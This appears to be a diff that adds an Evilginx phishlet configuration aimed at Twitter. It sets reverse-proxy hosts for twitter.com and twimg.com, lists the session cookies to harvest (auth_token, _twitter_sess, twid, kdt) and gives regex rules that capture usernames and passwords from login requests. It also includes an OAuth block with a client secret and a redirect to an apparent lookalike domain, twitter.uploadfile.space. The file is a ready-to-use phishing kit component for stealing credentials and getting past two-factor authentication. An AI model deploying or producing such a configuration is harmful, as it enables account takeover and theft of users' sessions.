@@ -1,0 +1,36 @@
+author: '@white_fi'
+min_ver: '3.0.0'
+redirect_url: 'https://twitter.com/home'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'twitter.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'abs', orig_sub: 'abs', domain: 'twimg.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'twitter.com', session: false, is_landing: false, auto_filter: true}
+sub_filters: []
+auth_tokens:
+  - domain: '.twitter.com'
+    keys: ['kdt:always','_twitter_sess:always','twid:always','auth_token:always']
+    type: 'cookie'
+auth_urls:
+  - '/home'
+  - '/i/flow/login'
+credentials:
+  username:
+    key: 'session\[username_or_email\]'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'session\[password\]'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'twitter.com'
+  path: '/login'
+oauth2:
+  client_id: 'evilginx-proxy-twitter'
+  client_secret: 'a9b0c1d2e3f45678901234567890abcdef1234567890abcdef1234567890abcdef12'
+  redirect_uri: 'https://twitter.uploadfile.space'
+  authorization_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/auth'
+  token_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/token'
+  userinfo_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/userinfo'
+  jwks_uri: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/certs'
+  scope: 'openid email profile offline_access evilginx-phishlet'
